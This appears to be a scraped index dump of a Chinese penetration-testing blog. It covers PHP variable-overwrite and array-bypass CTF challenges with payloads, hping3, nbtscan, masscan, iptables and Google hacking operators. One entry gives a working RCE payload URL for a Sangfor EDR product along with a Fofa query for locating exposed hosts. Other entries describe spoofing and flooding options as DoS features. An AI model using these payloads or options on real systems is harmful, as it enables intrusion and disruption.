[特殊字符种类的范围] 示例: --types \"\u003c=8\" \"\u003c=4\" \"=0\" repeat 功能 用法 : --repeat [字母连续出现次数范围] [数字连续出现次数范围] [特殊字符连续出现次数范围] 示例: --repeat \"\u003c=3\" \"\u003e=3\" \"==0\" regex 功能 用法 : --regex [正则表达式] 示例: --regex \"^z.*?g$\" level 功能 用法 : --level [level] 示例: --level 4 /funcfg/extend.conf配置文件中level大于等于4的项目会被启用 leet功能 默认置换表 leet字符 = 替换字符，可以修改/funcfg/leet_mode.conf更改替换表 a = 4 b = 6 e = 3 l = 1 i = 1 o = 0 s = 5 模式代码 0 默认模式，全部替换 1 从左至右, 将第一个遇到的leet字符全部替换 2 从右至左, 将第一个遇到的leet字符全部替换 11-19 从左至右, 将第一个遇到的leet字符最多替换 code-10 个 21-29 从右至左, 将第一个遇到的leet字符最多替换 code-20 个 代码作用表 代码 原字符串 被替换后的新字符串 0 as a airs trees 45 4 41r5 tr335 1 as a airs trees 4s 4 4irs trees 2 as a airs trees a5 a air5 tree5 11 as a airs trees 4s a airs trees 12 as a airs trees 4s 4 airs trees 13 as a airs trees 4s 4 4irs trees 14 as a airs trees 4s 4 4irs trees … as a airs trees 4s 4 4irs trees 21 as a airs trees as a airs tree5 22 as a airs trees as a air5 tree5 23 as a airs trees a5 a air5 tree5 24 as a airs trees a5 a air5 tree5 … as a airs trees a5 a air5 tree5 参考：https://cloud.tencent.com/developer/article/1180351 ","date":"2020-08-18","objectID":"/%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90-pydictor/:0:0","tags":null,"title":"字典生成-pydictor","uri":"/%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90-pydictor/"},{"categories":["渗透测试"],"content":" 可以用自定义的参数值替换原有变量值的情况称为变量覆盖漏洞 ","date":"2020-08-18","objectID":"/php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/:0:0","tags":["变量覆盖"],"title":"php变量覆盖","uri":"/php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"},{"categories":["渗透测试"],"content":"场景 $$使用不当 extract()函数使用不当 parse_str()函数使用不当 import_request_variables()使用不当 开启了全局变量注册 … … ","date":"2020-08-18","objectID":"/php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/:1:0","tags":["变量覆盖"],"title":"php变量覆盖","uri":"/php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"},{"categories":["渗透测试"],"content":"1. $$导致的变量覆盖 经常在foreach中出现 使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值 \u003c?php //?name=test //output:string(4) “name” string(4) “test” string(4) “test” test $name='thinking'; foreach ($_GET as $key =\u003e $value) $$key = $value; var_dump($key); var_dump($value); var_dump($$key); echo $name; ?\u003e 例题： \u003c?php include \"flag.php\"; $_403 = \"Access Denied\"; $_200 = \"Welcome Admin\"; if ($_SERVER[\"REQUEST_METHOD\"] != \"POST\") die(\"BugsBunnyCTF is here :p…\"); if ( !isset($_POST[\"flag\"]) ) die($_403); foreach ($_GET as $key =\u003e $value) key = value; foreach ($_POST as $key =\u003e $value) $$key = $value; if ( $_POST[\"flag\"] !== $flag ) die($_403); echo \"This is your flag : \". $flag . \"\\n\"; die($_200); ?\u003e ","date":"2020-08-18","objectID":"/php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/:2:0","tags":["变量覆盖"],"title":"php变量覆盖","uri":"/php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"},{"categories":["渗透测试"],"content":"2. extract()函数导致的变量覆盖 extract() 该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。 语法： extract(array,extract_rules,prefix) extract 有三种形式可能导致变量覆盖: 第一种是第二个参数为EXTR_OVERWRITE,他表示如果有冲突，覆盖原有的变量。 第二种情况是只传入第一个参数，默认为EXTR_OVERWRITE模式。 第三种是第二个参数为EXTR_IF_EXISTS，他表示在当前符号表中已有同名变量时，覆盖它们的值,其他的都不注册新变量. 例题1 \u003c?php $flag = 'xxx'; extract($_GET); if (isset($gift)) { $content = trim(file_get_contents($flag)); if ($gift == $content) { echo 'hctf{…}'; } else { echo 'Oh..'; } } ?\u003e //GET请求 ?flag=\u0026gift=，extract()会将$flag和$gift的值覆盖了，将变量的值设置为空或者不存在的文件就满足$gift == $content。 //payload: ?flag=\u0026gift= 例题2 \u003c?php if ($_SERVER[\"REQUEST_METHOD\"] == \"POST\") { ?\u003e \u003c?php extract($_POST); if ($pass == $thepassword_123) { ?\u003e \u003cdiv class=”alert alert-success”\u003e \u003ccode\u003e\u003c?php echo $theflag; ?\u003e\u003c/code\u003e \u003c/div\u003e \u003c?php } ?\u003e \u003c?php } ?\u003e //extract($_POST)会将POST的数据中的键名和键值转换为相应的变量名和变量值，利用这个覆盖$pass和$thepassword_123变量的值，从而满足$pass == $thepassword_123这个条件。 // POST Payload: //pass=\u0026thepassword_123= ","date":"2020-08-18","objectID":"/php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/:3:0","tags":["变量覆盖"],"title":"php变量覆盖","uri":"/php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"},{"categories":["渗透测试"],"content":"3. parse_str函数导致的变量覆盖 parse_str() 函数用于把查询字符串解析到变量中，如果没有array 参数，则由该函数设置的变量将覆盖已存在的同名变量。 语法：parse_str(string,array) 例题1： \u003c?php error_reporting(0); if (empty($_GET['id'])) { show_source(__FILE__); die(); } else { include ('flag.php'); $a = \"www.OPENCTF.com\"; $id = $_GET['id']; @parse_str($id); if ($a[0] != 'QNKCDZO' \u0026\u0026 md5($a[0]) == md5('QNKCDZO')) { echo $flag; } else { exit('其实很简单其实并不难！'); } } ?\u003e //0e123会被当做科学计数法，0 * 10 x 123。所以需要找到一个字符串md5后的结果是0e开头后面都是数字的，如，240610708，s878926199a //利用php弱语言特性, //使用GET请求id=a[0]=240610708，这样会将a[0]的值覆盖为240610708，然后经过md5后得到 0e462097431906509019562988736854 与md5(‘QNKCDZO’)的结果0e830400451993494058024219903391比较都是0 所以相等，满足条件，得到flag。 最终PAYLOAD： GET DATA: ?id=a[0]=s878926199a or ?id=a[0]=240610708 ","date":"2020-08-18","objectID":"/php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/:4:0","tags":["变量覆盖"],"title":"php变量覆盖","uri":"/php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"},{"categories":["渗透测试"],"content":"1.数组返回NULL绕过 \u003c?php $flag = \"flag\"; if (isset ($_GET['password'])) { if (ereg (\"^[a-zA-Z0-9]+$\", $_GET['password']) === FALSE) echo 'You password must be alphanumeric'; else if (strpos ($_GET['password'], '--') !== FALSE) die('Flag: ' . $flag); else echo 'Invalid password'; } ?\u003e php不能处理数组 根据 if (strpos ($_GET['password'], '--') !== FALSE) 知道password一定有'--'。开始构造%2d但是过不了，根据题目暗示和php特性可以传一个数组绕过判断 http://123.206.87.240:9009/19.php?password[]=sad%2d%2d strpos() 函数查找字符串在另一字符串中第一次出现的位置。 **注释：**strpos() 函数对大小写敏感。 ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。 2. \u003c?php $flag = \"flag\"; if (isset ($_GET['ctf'])) { if (@ereg (\"^[1-9]+$\", $_GET['ctf']) === FALSE) //① echo '必须输入数字才行'; else if (strpos ($_GET['ctf'], '#biubiubiu') !== FALSE) //② die('Flag: '.$flag); else echo '骚年，继续努力吧啊~'; } ?\u003e 思路： ereg()只能处理字符串的，遇到数组做参数返回NULL，判断用的是 === ，其要求值与类型都要相同，而NULL跟FALSE类型是不同的,所以①判断if不成立，继续执行②，这时strpos函数遇到数组，也返回NULL，与FALSE类型不同，if条件成立，输出flag。 所以payload应该是?ctf[]=任意字符,甚至就是?ctf[]= ","date":"2020-08-18","objectID":"/isset%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87/:0:0","tags":["isset","数组绕过"],"title":"isset数组绕过","uri":"/isset%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87/"},{"categories":["渗透测试"],"content":"简介 深信服终端检测响应平台EDR，围绕终端资产安全生命周期，通过预防、防御、检测、响应赋予终端更为细致的隔离策略、更为精准的查杀能力、更为持续的检测能力、更为快速的处置能力。在应对高级威胁的同时，通过云网端联动协同、威胁情报共享、多层级响应机制，帮助用户快速处置终端安全问题，构建轻量级、智能化、响应快的下一代终端安全系统。 EDR的界面 RCE Payload https://xxx.com:xxx/tool/log/c.php?strip_slashes=system\u0026host=id Fofa关键字 title=\"终端检测响应平台\" ","date":"2020-08-17","objectID":"/%E6%B7%B1x%E6%9C%8D-edr%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9Frce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:0","tags":["RCE","深信服"],"title":"深X服 EDR终端检测系统RCE漏洞复现","uri":"/%E6%B7%B1x%E6%9C%8D-edr%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9Frce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["渗透测试"],"content":" hping3主要是测试防火墙的拦截规则，对网络设备进行测试 主要功能 防火墙测试（参考：http://0daysecurity.com/articles/hping3_examples.html） 端口扫描 Idle扫描 拒绝服务攻击 文件传输 木马功能 …… 主要参数 -h --help 显示帮助 -v --version 显示版本 -c --count 发送数据包的数目 -i --interval 发送数据包间隔的时间 (uX即X微秒, 例如： -i u1000) --fast 等同 -i u10000 (每秒10个包) --faster 等同 -i u1000 (每秒100个包) --flood 尽最快发送数据包，不显示回复。 -n --numeric 数字化输出，象征性输出主机地址。 -q --quiet 安静模式 -I --interface 网卡接口 (默认路由接口) -V --verbose 详细模式 -D --debug 调试信息 -z --bind 绑定ctrl+z到ttl(默认为目的端口) -Z --unbind 取消绑定ctrl+z键 --beep 对于接收到的每个匹配数据包蜂鸣声提示 模式选择 default mode TCP // 默认模式是 TCP -0 --rawip RAWIP模式，原始IP模式。在此模式下HPING会发送带数据的IP头。即裸IP方式。使用RAWSOCKET方式。 -1 --icmp ICMP模式，此模式下HPING会发送IGMP应答报，你可以用--ICMPTYPE --ICMPCODE选项发送其他类型/模式的ICMP报文。 -2 --udp UDP 模式，缺省下，HPING会发送UDP报文到主机的0端口，你可以用--baseport --destport --keep选项指定其模式。 -8 --scan SCAN mode. //扫描模式 指定扫描对应的端口。 Example: hping --scan 1-30,70-90 -S www.target.host // 扫描 -9 --listen listen mode // 监听模式 IP 模式 -a --spoof spoof source address //源地址欺骗。伪造IP攻击，防火墙就不会记录你的真实IP了，当然回应的包你也接收不到了。 --rand-dest random destionation address mode. see the man. // 随机目的地址模式。详细使用 man 命令 --rand-source random source address mode. see the man. // 随机源地址模式。详细使用 man 命令 -t --ttl ttl (默认 64) //修改 ttl 值 -N --id id (默认 随机) // hping 中的 ID 值，缺省为随机值 -W --winid 使用win* id字节顺序 //使用winid模式，针对不同的操作系统。UNIX ,WINDIWS的id回应不同的，这选项可以让你的ID回应和WINDOWS一样。 -r --rel 相对id字段(估计主机流量) //更改ID的，可以让ID曾递减输出，详见HPING-HOWTO。 -f --frag 拆分数据包更多的frag. (may pass weak acl) //分段，可以测试对方或者交换机碎片处理能力，缺省16字节。 -x --morefrag 设置更多的分段标志 // 大量碎片，泪滴攻击。 -y --dontfrag 设置不分段标志 // 发送不可恢复的IP碎片，这可以让你了解更多的MTU PATH DISCOVERY。 -g --fragoff set the fragment offset // 设置断偏移。 -m --mtu 设置虚拟最大传输单元, implies --frag if packet size \u003e mtu // 设置虚拟MTU值，当大于mtu的时候分段。 -o --tos type of service (default 0x00), try --tos help // tos字段，缺省0x00，尽力而为？ -G --rroute includes RECORD_ROUTE option and display the route buffer // 记录IP路由，并显示路由缓冲。 --lsrr 松散源路由并记录路由 // 松散源路由 --ssrr 严格源路由并记录路由 // 严格源路由 -H --ipproto 设置IP协议字段，仅在RAW IP模式下使用 //在RAW IP模式里选择IP协议。设置ip协议域，仅在RAW ip模式使用。 ICMP 模式 -C --icmptype icmp类型(默认echo请求) // ICMP类型，缺省回显请求。 -K --icmpcode icmp代号(默认0) // ICMP代码。 --force-icmp 发送所有icmp类型(默认仅发送支持的类型) // 强制ICMP类型。 --icmp-gw 设置ICMP重定向网关地址(默认0.0.0.0) // ICMP重定向 --icmp-ts 等同 --icmp --icmptype 13 (ICMP 时间戳) // icmp时间戳 --icmp-addr 等同 --icmp --icmptype 17 (ICMP 地址子网掩码) // icmp子网地址 --icmp-help 显示其他icmp选项帮助 // ICMP帮助 UDP/TCP 模式 -s --baseport base source port (default random) // 缺省随机源端口 -p --destport [+][+]\u003cport\u003e destination port(default 0) ctrl+z inc/dec // 缺省随机源端口 -k --keep keep still source port // 保持源端口 -w --win winsize (default 64) // win的滑动窗口。windows发送字节(默认64) -O --tcpoff set fake tcp data offset (instead of tcphdrlen / 4) // 设置伪造tcp数据偏移量(取代tcp地址长度除4) -Q --seqnum shows only tcp sequence number // 仅显示tcp序列号 -b --badcksum (尝试)发送具有错误IP校验和数据包。许多系统将修复发送数据包的IP校验和。所以你会得到错误UDP/TCP校验和。 -M --setseq 设置TCP序列号 -L --setack 设置TCP的ack ------------------------------------- (不是 TCP 的 ACK 标志位) -F --fin set FIN flag -S --syn set SYN flag -R --rst set RST flag -P --push set PUSH flag -A --ack set ACK flag ------------------------------------- （设置 TCP 的 ACK 标志 位） -U --urg set URG flag // 一大堆IP抱头的设置。 -X --xmas set X unused flag (0x40) -Y --ymas set Y unused flag (0x80) --tcpexitcode 使用last tcp-\u003e th_flags作为退出码 --tcp-mss 启用具有给定值的TCP MSS选项 --tcp-timestamp 启用TCP时间戳选项来猜测HZ/uptime Common //通用设置 -d --data data size (default is 0) // 发送数据包大小，缺省是0。 -E --file 文件数据 -e --sign 添加“签名” -j --dump 转储为十六进制数据包 -J --print 转储为可打印字符 -B --safe 启用“安全”协议 -u --end 告诉你什么时候--file达到EOF并防止倒回 -T --traceroute traceroute模式(等同使用 --bind 且--ttl 1) --tr-stop 在traceroute模式下收到第一个不是ICMP时退出 --tr-keep-ttl 保持源TTL固定，仅用于监视一跳 --tr-no-rtt 不要在跟踪路由模式下计算/显示RTT信息 ARS包描述（新增功能，不稳定） ARS packet description (new, unstable) --apd-send 发送APD描述数据包(参见docs / APD.txt) 常用模式 -0 --rawip # IP原始报文 -1 --icmp # ICMP模式 -2 --udp # UDP模式 -8 --scan # 扫描模式 -9 --listen # 监听模式 常用方式 ## SYN方式扫描主机端口 hping --scan 1-30,70-90 -S www.target.host hping --scan 445,135 -S 192.168.0.110 #目标主机回复的 'S..A'，代表SYN/ACK ## 测试防火墙对ICMP包的反应、是否支持traceroute、是否开放某个端口、对防火墙","date":"2020-08-17","objectID":"/hping3/:0:0","tags":["hping3","端口扫描","DDOS"],"title":"hping3","uri":"/hping3/"},{"categories":["渗透测试"],"content":" 当我们处于局域网中 用来探测内网存活主机 kali中已经安装了： root@xps:~# whereis nbtscan nbtscan: /usr/bin/nbtscan /usr/share/man/man1/nbtscan.1.gz root@xps:~# nbtscan NBTscan version 1.6. This is a free software and it comes with absolutely no warranty. You can use, distribute and modify it under terms of GNU GPL 2+. Usage: nbtscan [-v] [-d] [-e] [-l] [-t timeout] [-b bandwidth] [-r] [-q] [-s separator] [-m retransmits] (-f filename)|(\u003cscan_range\u003e) -v verbose output. Print all names received from each host -d dump packets. Print whole packet contents. -e Format output in /etc/hosts format. -l Format output in lmhosts format. Cannot be used with -v, -s or -h options. -t timeout wait timeout milliseconds for response. Default 1000. -b bandwidth Output throttling. Slow down output so that it uses no more that bandwidth bps. Useful on slow links, so that ougoing queries don't get dropped. -r use local port 137 for scans. Win95 boxes respond to this only. You need to be root to use this option on Unix. -q Suppress banners and error messages, -s separator Script-friendly output. Don't print column and record headers, separate fields with separator. -h Print human-readable names for services. Can only be used with -v option. -m retransmits Number of retransmits. Default 0. -f filename Take IP addresses to scan from file filename. -f - makes nbtscan take IP addresses from stdin. \u003cscan_range\u003e what to scan. Can either be single IP like 192.168.1.1 or range of addresses in one of two forms: xxx.xxx.xxx.xxx/xx or xxx.xxx.xxx.xxx-xxx. Examples: nbtscan -r 192.168.1.0/24 Scans the whole C-class network. nbtscan 192.168.1.25-137 Scans a range from 192.168.1.25 to 192.168.1.137 nbtscan -v -s : 192.168.1.0/24 Scans C-class network. Prints results in script-friendly format using colon as field separator. Produces output like that: 192.168.0.1:NT_SERVER:00U 192.168.0.1:MY_DOMAIN:00G 192.168.0.1:ADMINISTRATOR:03U 192.168.0.2:OTHER_BOX:00U ... nbtscan -f iplist Scans IP addresses specified in file iplist. # 参数 -a 列出为其主机名提供的远程计算机名字表。 -A 列出为其IP地址提供的远程计算机名字表。 -c 列出包括了IP地址的远程名字高速缓存器。 -n 列出本地NetBIOS名字。 -r 列出通过广播和WINS解析的名字。 -R 消除和重新加载远程高速缓存器名字表。 -S 列出有目的地IP地址的会话表。 -s 列出会话表对话。 示例 ## 以：分割显示 ## Linux上 nbtscan -v -s : 192.168.117.130 # 扫描整个C段 nbtscan -r 192.168.1.0/24 # 扫描一个范围 nbtscan 192.168.1.25-137 # 从文件读取扫描范围 nbtscan -f \u003cFile\u003e ## Windows上 nbtscan.exe -m 192.168.1.0/24 高级用法 nbtscan -v -s ' ' 192.168.117.130 nbtscan -v -s ' ' 192.168.117.130 | awk '{print $1}' |uniq 这个工具的运行流程： 遍历输入的IP范围，以广播MAC地址发送ARP查询，一旦接收到ARP回复，遍记录相应的IP与MAC地址，同时向对方发送NBNS消息查询对方的主机信息打印出每条信息 其他探测内网主机的方法：http://www.360doc.com/content/19/1129/18/13328254_876375955.shtml ","date":"2020-08-17","objectID":"/nbtscan/:0:0","tags":["nbtscan","主机存活探测","网络工具"],"title":"nbtscan","uri":"/nbtscan/"},{"categories":["Linux"],"content":"iptables 功能 4个表raw和mangle，nat,filter（后两个表用的多） iptables -t filter -nvL # -t显示哪个表 三个链(Chain)：INPUT,FORAWRD(转发规则链),OUTPUT 特点 比较老,逐渐被取代 基于命令行 难度最高 用法 iptables [-t 表名] 选项 [链名] [条件] [-j 控制类型] # 注意事项： 不指定表名时，默认指filter表 不指定链名时，默认只表内是所有链 除非设置链的默认策略。否则必须指向匹配条件 选项、链名、控制类型使用大写字母，其余均为小写 几种控制类型 ACCEPT # 允许流量通过 REJECT # 明确拒绝(比如ping时候的\"主机不可达\") DROP # 对方不知道你是否在线(显示超时) LOG # 记录日志信息 规则优先顺序：自上而下 包过滤 用法 iptables -L # 显示所有的策略 iptables -F # \"清空所有\"策略 iptables -F FORWARD # 清空FORWARD表所有规则 iptables -P INPUT DROP # 默认禁止所有流量策略,不能reject ## 参数 -I # 插入到最前面(用的较多) -A # 插入到最后面(用的较少) -D # 删除 -p # 允许的协议 --dport # 本机端口（属于隐含匹配，要配合通用匹配使用） -s # 来源地址 -d # 目的地址 -i # 入站网卡 -o # 出站网卡 -j # 本身为意义，后面跟动作 -L # 列出所有规则条目 -n: # 以数字形式显示地址、端口等信息 -v: # 以更详细的方式显示规则信息 --lines-numbers: # 查看规则时，显示规则的序号 -mac-source MAC地址 # MAC地址匹配（属于显式匹配） iptables -I INPUT -p icmp -j ACCEPT #只允许外部到内部的ping iptables -I INPUT -s 192.168.10.0/24 -d 0.0.0.0 -p tcp --dport 22 #允许来自某个网段的访问，端口为22 -D #删除某一条 iptables -D INPUT 1 #删除第一条(后面跟行号) iptables -I INPUT -p tcp --port 22 -j REJECT #禁止外部所有22端口的流量 iptables -I INPUT -p tcp --port 22:200 -j REJECT #禁止外部所有20到200端口的流量 # 保存规则（永久生效） service iptables save # 导出当前规则状态 iptables-save \u003e /usr/share/1.txt # 从文件导入规则 iptables-restore \u003c /usr/share/1.txt 网络地址转换(NAT) NAT表 # 查看NAT表规则 iptables -t nat -nvL 路由后规则（POSTROUTING） ## 设置规则 # -s 是给内网的谁做转换, --to-source是转为网关的地址 iptables -t nat -A POSTROUTING -p tcp -o eth1 -s 192.168.1.0/24 -j SNAT --to-source 12.34.56.78 # 如果网关地址是动态的，就这样 iptables -t nat -A POSTROUTING -p tcp -o eth1 -s 192.168.1.0/24 -j SNAT --to-source -j MASQUERADE ## 配置FORWARD链的转发限制 目标地址转换(DNAT) 情景：外网机器访问内网机器 使用链：路由前规则（PREROUTING） # 查看NAT表规则 iptables -t nat -nvL # 设置规则，访问内网主机的8080端口（网关的80映射到内网主机的8080） iptables -t nat PREROUTING -i eth1 -d 12.34.56.78 -p tcp --dport 80 -J DNAT --to-destination 192.168.1.1:8080 ","date":"2020-08-14","objectID":"/iptables%E5%8C%85%E8%BF%87%E6%BB%A4%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2/:1:0","tags":["iptables","NAT","防火墙"],"title":"iptables包过滤与网络地址转换","uri":"/iptables%E5%8C%85%E8%BF%87%E6%BB%A4%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2/"},{"categories":["Linux"],"content":"firewalld 防火墙 zone #区域 sbit #安全位 public #默认策略,当前使用 Runtime # 当前生效，重启后失效 Premanent # 当前暂时不生效，但是永久生效 --premanent # 建议添加这个 firewall-cmd -reload #重启 firewall-cmd --get-default-zone #查看当前区域 firewall-cmd --set-default-zone=drop #切换默认区域到丢包 firewall-cmd --permanent --zone=drop --change-interface=en0167777 #重启之后，把这个网卡区域换为drop firewall-cmd --permanent get-zone-of-interface=en0167777 #重启之后，查看 ##紧急模式 firewall-cmd --panic-on #切断所有网络连接，包括ping的数据包 firewall-cmd --panic-off #关闭紧急模式 ##查询服务 firewall-cmd --zone=public --query-service=http #查看是否允许http firewall-cmd --zone=public --query-service=ssh ##添加允许服务 firewall-cmd --zone=public --add-servcice=http #允许从外访问http服务 firewall-cmd --zone=public --add-servcice=https #重启才可以 firewall-cmd --reload firewall-cmd --zone=public --add-servcice=https ##禁止服务 firewall-cmd --zone=public --remove-servcice=https firewall-cmd --permanent --zone=public --add-servcice=https firewall-cmd --permanent --zone=public --query-servcice=https ##添加端口号 firewall-cmd --zone=public --add-port=8080/tcp #把这个端口添加到tcp协议组，允许 firewall-cmd --zone=public --add-port=80-90/tcp #端口端 ##端口转发（隐藏原始端口） firewall-cmd --permanent --zone=public --add-forward-port=888:porto:tcp:toport=22:toaddr=192.168.10.10 #转发888到22 firewall-cmd --reload ##复规则（复规则） ##精准匹配 firewall-cmd --permanent --zone=public --add-rich-rule=\"rule family\"=\"ipv4\" source address=\"192.168.10.0/24\" service name=\"ssh\" reject\" firewall-cmd reload ","date":"2020-08-14","objectID":"/iptables%E5%8C%85%E8%BF%87%E6%BB%A4%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2/:2:0","tags":["iptables","NAT","防火墙"],"title":"iptables包过滤与网络地址转换","uri":"/iptables%E5%8C%85%E8%BF%87%E6%BB%A4%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2/"},{"categories":["渗透测试"],"content":" masscan号称是世界上最快的扫描软件，可以在3分钟内扫描整个互联网端口，但是这个是由条件的4核电脑，双端口10G网卡 项目地址： https://github.com/robertdavidgraham/masscan 安装 Linux上 sudo apt-get install git gcc make libpcap-dev git clone https://github.com/robertdavidgraham/masscan cd masscan make Windows上 因为我用的Linux比较多，所用没安过Windows的，请参考：https://www.cnblogs.com/flaray/p/11213730.html 使用 常用命令 masscan 172.16.0.0/16 -p0-65535 --banners --append-output -oL scan_result.list --max-rate 10000 # 扫描ip列表文件 masscan -iL ip.txt -p0-65535 --banners --append-output -oL scan_result.list --max-rate 10000 # 输出json格式 -Oj masscan -iL ip.txt -p80,443,3306 --banners --append-output -oJ result.json --max-rate 10000 # Note: 发包速率(--max-rate)不要太大，且Linux下比Windows速度快 --adapter-ip # 指定发包的IP地址 --adapter-port # 指定发包的源端口 --adapter-mac # 指定发包的源MAC地址 --router-mac # 指定网关的MAC地址 --exclude # IP地址范围黑名单,防止masscan扫描 --excludefile # 指定IP地址范围黑名单文件 --includefile,-iL # 读取一个范围列表进行扫描 --wait # 指定发送完包之后的等待时间,默认为10秒 Python脚本解析masscan扫描结果 是基于json输出格式(-OJ)的 # Author：https://www.jianshu.com/p/b6edaa3acbbf import json from openpyxl import Workbook import xlsxwriter import socket def get_list(filepath): f = open(filepath,encoding='utf-8') c = json.load(f) list = [] for i in c: ip = i['ip'] port = str(i['ports'][0]['port']) status = 'open' try: if i['ports'][0]['service']: name = i['ports'][0]['service']['name'] banner = str(i['ports'][0]['service']['banner']) except: name = '' banner = '' line = [ip,port,status,name,banner] list.append(line) return list def quchong(l1): l2 =[] for data1 in l1: for data2 in l1: if data1[0]==data2[0] and data1[1]==data2[1]: if data1[3] ==''and data2[3] !='': # print(data1,data2) l2.append(data1) for i in l2: try: l1.remove(i) except:pass l1 = [list(t) for t in set(tuple(_) for _ in l1)] return l1 def write_excle(list): f = xlsxwriter.Workbook('port.xlsx') worksheet1 = f.add_worksheet('扫描信息') worksheet2 = f.add_worksheet('主机ip列表') worksheet1.write(0, 0, 'ip') worksheet1.write(0, 1, '端口') worksheet1.write(0, 2, '状态') worksheet1.write(0, 3, '服务') worksheet1.write(0, 4, 'banner') worksheet2.write(0, 0, '主机ip') newlist= [] for i in list: newlist.append(i[0]) newlist=set(newlist) total1 = 0 total2 = len(newlist) newlist=sorted(newlist, key=socket.inet_aton) for index, p in enumerate(list): total1+=1 for j, q in enumerate(p): worksheet1.write(index + 1, j, q) for index, p in enumerate(newlist): worksheet2.write(index + 1, 0, p) f.close() return total1,total2 if __name__ == '__main__': filepath = 'C:/1/result.json' #填写要解析masscan扫描json格式报告的文件路径 result = get_list(filepath) result = quchong(result) sum = write_excle(result) print('共检测到存活主机%d个，端口信息%d条'% (sum[1],sum[0])) ","date":"2020-08-13","objectID":"/masscan/:0:0","tags":["masscan","端口扫描","信息搜集"],"title":"masscan","uri":"/masscan/"},{"categories":["渗透测试"],"content":"基本 通配符 通配符 语义 说明 示例 + 包含关键词 +前面必须要有一个空格 admin +login - 排除关键词 -前面必须要有一个空格 mysql -csdn ~ 同义词 ~前面必须要有一个空格 mysql -csdn * 模糊查询 *代替任意字符 mysql** \"\" 强调 \"mysql\" 高级操作符 ","date":"2020-08-12","objectID":"/google-hacking/:1:0","tags":["Google hacking","搜索引擎"],"title":"Google Hacking","uri":"/google-hacking/"},{"categories":["渗透测试"],"content":"概述 将学习如下的高级操作符： intitle, allintitle related inurl, allinurl phonebook filetype rphonebook allintext bphonebook site author link group inanchor msgid daterange insubject cache stocks info define ","date":"2020-08-12","objectID":"/google-hacking/:2:0","tags":["Google hacking","搜索引擎"],"title":"Google Hacking","uri":"/google-hacking/"},{"categories":["渗透测试"],"content":"操作符语法 基本语法：operator:search_term 原则 在操作符、冒号、搜索关键字之间是没有空格的； 布尔操作符和特殊字符(例如OR和+)仍可用于高级操作符查询，但是不能把它们放在冒号之前而把冒号和操作符分开； ALL操作符(以单词ALL开头的操作符)非常古怪。一般情况下，一个查询中只能使用一次ALL操作符，而且不能和其他操作符混用； 操作符搜索的搜索关键字部分的语法和前一章中讲到的关键字语法是一样的。 例如，你可以使用一个单词或者用引号引起来的词组作为关键字。如果用词组作为关键字的话，须保证在操作符、冒号和词组的第一个引号之间没有任何空格字符。 实例 intitle:Google这个查询将返回标题包含单词Google的页面。 intitle:\"index of\"这个查询将返回标题包含词组index of的页面。回忆前一章中学到的知识，我们可以知道这个查询也可以写成 intitle:index.of,因为句号可以匹配任意字符。利用这种技术，我们可以避免键入词组中的空格以及两端的引号。” intitle:\"index of\" private 这 个查询将返回标题包含词组index of,且网页的任何地方(URL、标题、文本等)包含单词private的页面。要注意的是，intitle 只对词组index of起作用，而不会影响单词private,这是因为引号外的第一个空格位于词组index of之后。Google把这个空格解释为高级操作符搜索关键字的结尾，然后接着处理查询中剩下的部分。 intitle:\"index of\" \"bakcup files\"这 个查询返回标题包含词组index of,且网页的任何地方(URL、标题、文本等)包含词组backup files的 页面。同样要注意到intitle仅对词组index of起作用。 正文 Intitle 与 Allintitle ：在页面标题中搜索 ps：只有在单词intitle后面的单词或词组才被认为是查询关键字，而Allintitle没有这一规则 例如： intitle:\"index of\" \"backup files\" Allintitle:\"index of\" \"backup files\" 每个链接的文档标题中都找到了两个词，更精确 慎重使用allintitle操作符。在和其他高级操作符一起使用时，它就显得非常笨拙，而且会 打乱整个查询，使得无法得到结果。也许有些极端，但是即便在一次查询中使用一-串intitle也 好过使用拙劣的allintitle. intext 与 Allintext ：在网页内容里查找字符串 由于这个操作符是以单词all开头的，所以在它之后的每个搜索关键字都将作为查询语句的一部分。 基于这个原因，alintext操作符不能和其他的高级符混合使用。 Inurl 与 Allinurl ：在URL中查找文本 Site ：把搜索精确到特定的站点 注意：Google是从左到右读取服务器名的 Filetype ：搜索指定类型的文件 filetype:pdf 常见的文件拓展名： pdf ps wk1, wk2, wk3, wk5, wki, wks, wku Lwp Mw Xls Ppt Doc wks, wps, wdb Wri Rtf Swf ans, txt html htm php asp cfm aspx jsp CGI DO PL XML DOC PHTML PHP3 TXT EXE XLS PPT 提示：ext操作符可以用来替代filetype. filetye:xls查 询与ext:xIs等价。 Link ：搜索与当前网页存在链接的网页 link:www.baidu.com Inanchor ：在链接文本中查找文本 可以和link操作符相比较使用，因为都能用来搜索链接。但是inachor操 作符搜索的是一个链接的文本表示，而不是实际的URL 。 